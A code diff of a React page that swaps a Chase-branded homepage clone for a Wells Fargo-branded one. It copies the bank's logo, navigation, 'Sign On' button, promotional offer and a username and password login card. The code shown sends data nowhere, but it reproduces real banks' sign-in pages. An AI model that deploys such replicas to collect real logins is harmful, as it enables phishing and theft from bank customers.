@@ -1,230 +1,113 @@
 import { useState } from "react";
-import { TopNav } from "../components/HomeNavbar";
-import LoginCard from "../components/LoginCard";
-import landingImg from "../assets/home.webp"
-import { BriefcaseBusiness, BusIcon, ChessKing, CreditCard, Home, HomeIcon, Plane, SaveIcon, User, UserIcon } from "lucide-react";
+import navlogo from "../assets/wflogo.webp";
+import Login from "../components/LoginCard";
 import { Link } from "react-router-dom";
-
-
-
-const ICONS = [
-  { icon: <BriefcaseBusiness  />, label: "Business" },
-  { icon: <CreditCard/>, label: "Credit cards" },
-  { icon: <ChessKing/>, label: "Checking" },
-  { icon: <Plane/>, label: "Travel" },
-  { icon: <SaveIcon/>, label: "Savings" },
-  { icon: <Home/>, label: "Home loans" },
+const mainNavItems = [
+  "Personal",
+  "Investing & Wealth Management",
+  "Business",
+  "Commercial Banking",
+  "Corporate & Investment Banking",
+  "About Wells Fargo",
 ];
 
-
-
-const CARDS = [
-  {
-    title: "Sapphire Reserve®",
-    icon: <CreditCard/>,
-    blue: true,
-    badge: "Exclusive Offer:",
-    headline: "Up to 175,000 points",
-    sub: "See if you're preapproved with no impact to your credit score.",
-    btn: "Get started",
-    outline: false,
-  },
-  {
-    title: "Home Lending",
-    icon: <HomeIcon/>,
-    blue: true,
-    badge: "Guaranteed on-time closing",
-    headline: "Or get $5,000",
-    sub: "Eligible products close in as soon as three weeks.",
-    btn: "Get started",
-    outline: false,
-  },
-  {
-    title: "J.P. Morgan",
-    icon: <UserIcon/>,
-    blue: false,
-    badge: "Don't go it alone",
-    headline: "",
-    sub: "Work with a dedicated advisor to reach your goals.",
-    btn: "Continue",
-    outline: true,
-  },
+const subNavItems = [
+  "Checking",
+  "Savings & CDs",
+  "Credit Cards",
+  "Home Loans",
+  "Personal Loans",
+  "Auto Loans",
+  "Premier",
+  "Education & Tools",
 ];
 
+export default function WellsFargoHomepage() {
+  const [activeNav, setActiveNav] = useState("Personal");
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [saveUsername, setSaveUsername] = useState(false);
 
-function HeroSection({ onLogin, loginError }) {
   return (
-    <section className="bg-[#005eb8] min-h-[420px] flex items-center px-10 py-12">
-      <div className="w-full max-w-6xl mx-auto flex justify-between items-center gap-10 flex-wrap">
+    <div className="font-sans bg-[#f5f0eb] min-h-screen">
 
-        {/* Left: decorative image placeholder */}
-        <div className=" items-center justify-center text-white/40 text-7xl select-none">
-          <img src={landingImg} alt="" />
+      {/* Top Bar */}
+      <div className="bg-[#c0272d] flex items-center justify-between px-6 h-14">
+       <img src={navlogo} alt="" />
+        <div className="flex items-center gap-5">
+          {["ATMs/Locations", "Help", "Español"].map((item) => (
+            <span key={item} className="text-white text-sm cursor-pointer hover:underline">
+              {item}
+            </span>
+          ))}
+          <span className="text-white text-lg cursor-pointer select-none">&#128269;</span>
+          <button className="bg-white text-[#c0272d] rounded-full px-4 py-1.5 text-sm font-bold hover:bg-gray-100 transition-colors cursor-pointer">
+            Sign On
+          </button>
         </div>
-
-        {/* Center: copy */}
-        <div className="text-white max-w-md">
-          <h3 className="text-4xl font-bold leading-snug mb-3">
-            New Chase checking customers
-          </h3>
-          <p className="text-blue-100 text-base mb-6">
-            Open a Chase Total Checking® account with qualifying activities
-          </p>
-          <Link
-             to="/signup"
-            className="inline-block bg-[#1f8f3c] hover:bg-[#177032] text-white px-3 py-2 rounded font-semibold text-[18px] transition-colors"
-          >
-            Open an account
-          </  Link>
-        </div>
-
-        {/* Right: login */}
-        <LoginCard onLogin={onLogin} error={loginError} />
       </div>
-    </section>
-  );
-}
 
-function ChooseSection() {
-  const [activeIcon, setActiveIcon] = useState(0);
-  const [activeDot, setActiveDot] = useState(0);
-
-  return (
-    <section className="bg-white py-16 px-10 text-center">
-      <h2 className="text-3xl font-bold text-gray-900 mb-10">Choose what's right for you</h2>
-
-      {/* Icons */}
-      <div className="flex justify-center gap-8 mb-12 flex-wrap">
-        {ICONS.map((item, i) => (
-          <button
-            key={i}
-            onClick={() => setActiveIcon(i)}
-            className={`flex flex-col items-center gap-2 text-sm font-medium transition-all ${
-              activeIcon === i ? "text-[#005eb8] scale-110" : "text-gray-500 hover:text-[#005eb8]"
+      {/* Main Nav */}
+      <div className="bg-white border-b border-gray-200 px-6 flex gap-8 overflow-x-auto">
+        {mainNavItems.map((item) => (
+          <span
+            key={item}
+            onClick={() => setActiveNav(item)}
+            className={`py-3.5 text-sm cursor-pointer whitespace-nowrap border-b-2 transition-colors ${
+              activeNav === item
+                ? "border-[#c0272d] text-[#c0272d] font-bold"
+                : "border-transparent text-gray-700 hover:text-[#c0272d]"
             }`}
           >
-            <span className="text-3xl">{item.icon}</span>
-            {item.label}
-          </button>
-        ))}
-      </div>
-
-      {/* Cards */}
-      <div className="flex justify-center gap-7 flex-wrap">
-        {CARDS.map((card, i) => (
-          <div
-            key={i}
-            className="w-72 rounded-md shadow-lg overflow-hidden text-left"
-          >
-            <div className={`px-5 py-5 flex justify-between items-center ${card.blue ? "bg-[#005eb8] text-white" : "bg-gray-100 text-gray-900"}`}>
-              <h3 className="font-bold text-lg">{card.title}</h3>
-              <span className="text-2xl">{card.icon}</span>
-            </div>
-            <div className="px-5 py-5 text-sm text-gray-600 space-y-1">
-              <p className="font-bold text-gray-900">{card.badge}</p>
-              {card.headline && <p className="text-base font-semibold text-gray-800">{card.headline}</p>}
-              <p>{card.sub}</p>
-            </div>
-            <button
-              className={`w-full py-3 font-semibold text-sm transition-colors ${
-                card.outline
-                  ? "bg-white text-[#005eb8] border-t border-gray-200 hover:bg-gray-50"
-                  : "bg-[#0b6efd] hover:bg-[#0957d0] text-white"
-              }`}
-            >
-              {card.btn}
-            </button>
-          </div>
-        ))}
-      </div>
-
-      {/* Dots */}
-      <div className="flex justify-center gap-2 mt-8">
-        {[0, 1, 2].map((i) => (
-          <button
-            key={i}
-            onClick={() => setActiveDot(i)}
-            className={`w-2.5 h-2.5 rounded-full transition-colors ${activeDot === i ? "bg-[#005eb8]" : "bg-gray-300"}`}
-          />
-        ))}
-      </div>
-    </section>
-  );
-}
-
-function PromoSection() {
-  return (
-    <section className="bg-white py-16 px-10 max-w-6xl mx-auto">
-
-      {/* Top promo */}
-      <div className="flex items-center justify-between gap-12 mb-14 flex-wrap">
-        <div className="w-96 h-52 rounded-xl bg-[#005eb8] flex items-center justify-center text-white">
-          <div className="text-center">
-            <p className="text-lg mb-1">Earn up to</p>
-            <p className="text-8xl font-black leading-none">$500</p>
-          </div>
-        </div>
-        <div className="max-w-lg">
-          <h3 className="text-2xl font-bold text-gray-900 mb-3">
-            Keep your business moving forward with Chase
-          </h3>
-          <p className="text-gray-600 text-sm leading-relaxed mb-5">
-            Open a new Chase Business Complete Checking® account with qualifying
-            activities. For new business checking customers only.
-          </p>
-          <a href="#" className="inline-block bg-[#15803d] hover:bg-[#166534] text-white px-6 py-2.5 rounded font-semibold text-sm transition-colors">
-            Open account
-          </a>
-        </div>
-      </div>
-
-      <hr className="border-gray-200 mb-14" />
-
-      {/* Bottom promo */}
-      <div className="flex items-center justify-between gap-12 flex-wrap">
-        <div className="max-w-lg">
-          <h3 className="text-2xl font-bold text-gray-900 mb-3">
-            Earn a $200 bonus
-          </h3>
-          <p className="text-gray-600 text-sm leading-relaxed mb-5">
-            Plus, earn unlimited 1.5% cash back or more on all purchases,
-            including 3% on dining and drugstores —{" "}
-            <strong className="text-gray-900">all with no annual fee.</strong>
-          </p>
-          <a href="#" className="inline-block bg-[#0b6efd] hover:bg-[#0957d0] text-white px-6 py-2.5 rounded font-semibold text-sm transition-colors">
-            Learn more
-          </a>
-        </div>
-        <div className="w-96 h-52 rounded-xl bg-gradient-to-br from-gray-900 to-blue-900 flex items-end justify-end p-4">
-          <span className="bg-yellow-400 text-black text-xs font-bold px-3 py-1.5">
-            NO ANNUAL FEE
+            {item}
           </span>
-        </div>
+        ))}
       </div>
 
-    </section>
-  );
-}
+      {/* Sub Nav */}
+      <div className="bg-white border-b border-gray-200 px-6 flex gap-6 overflow-x-auto">
+        {subNavItems.map((item) => (
+          <span
+            key={item}
+            className="py-2.5 text-sm text-gray-700 cursor-pointer hover:text-[#c0272d] whitespace-nowrap"
+          >
+            {item}
+          </span>
+        ))}
+      </div>
 
-/* ─── Root ─── */
-export default function ChasePage() {
-  const [loginError, setLoginError] = useState("");
+      {/* Body */}
+      <div className="flex min-h-[460px] p-5">
 
-  const handleLogin = (username, password) => {
-    if (!username || !password) {
-      setLoginError("Please enter your username and password.");
-    } else {
-      setLoginError("");
-      alert(`Signing in as: ${username}`);
-    }
-  };
+        {/* Sign-in Panel */}
+       <Login/>
+        {/* Hero Section */}
+        <div className="flex-1 flex items-center px-12 py-10 gap-10">
+          <div>
+            <h1 className="text-5xl font-light text-gray-900 leading-tight mb-4 max-w-sm">
+              $325 checking bonus on us
+            </h1>
+            <p className="text-base text-gray-600 max-w-sm mb-6 leading-relaxed">
+              New customers open an eligible checking account with qualifying direct deposits
+            </p>
+            <Link to="/signup" className="border border-gray-500 rounded-full px-7 py-2.5 text-sm text-gray-800 bg-transparent hover:bg-[#e8e1d8] transition-colors cursor-pointer">
+              Get started &gt;&gt;
+            </Link>
+          </div>
 
-  return (
-    <div className="min-h-screen bg-white font-sans">
-      <TopNav />
-      <HeroSection onLogin={handleLogin} loginError={loginError} />
-      <ChooseSection />
-      <PromoSection />
+          {/* Offer Badge */}
+          <div className="ml-auto flex flex-col items-end">
+            <div className="w-16 h-0.5 bg-[#9c1c6e] mb-2" />
+            <p className="text-lg text-gray-700 font-normal leading-none mt-1">Enjoy</p>
+            <div className="text-8xl font-bold text-[#9c1c6e] leading-none mt-1">
+              <span className="text-4xl align-super">$</span>325
+            </div>
+            <div className="w-16 h-0.5 bg-[#9c1c6e] mt-3" />
+          </div>
+        </div>
+
+      </div>
     </div>
   );
 }
